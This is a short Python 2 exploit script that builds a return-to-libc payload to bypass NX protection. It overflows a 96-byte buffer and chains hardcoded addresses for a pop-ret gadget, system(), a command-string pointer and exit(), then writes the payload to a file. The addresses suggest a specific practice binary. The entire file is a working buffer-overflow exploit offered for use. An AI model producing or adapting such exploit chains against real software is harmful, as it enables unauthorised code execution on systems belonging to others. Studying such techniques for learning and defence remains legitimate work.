#!/usr/bin/python
# Author : Ramin Farajpour Cami
# Bypass NX with ret2libc


import struct

rop_pop_ret = struct.pack("<I", 0x565553b9)
libc_system = struct.pack("<I", 0xf7e06540)
libc_binls = struct.pack("<I", 0x56556683)
libc_exit  = struct.pack("<I", 0xf7df9590)

buffer = "A" * 96

buffer += rop_pop_ret
buffer += libc_binls
buffer += libc_system
buffer += libc_exit

buffer += libc_binls
buffer += libc_system
buffer += libc_exit


fp = open("rop.txt", "w")
fp.write(buffer)
fp.close()
print "Done!"

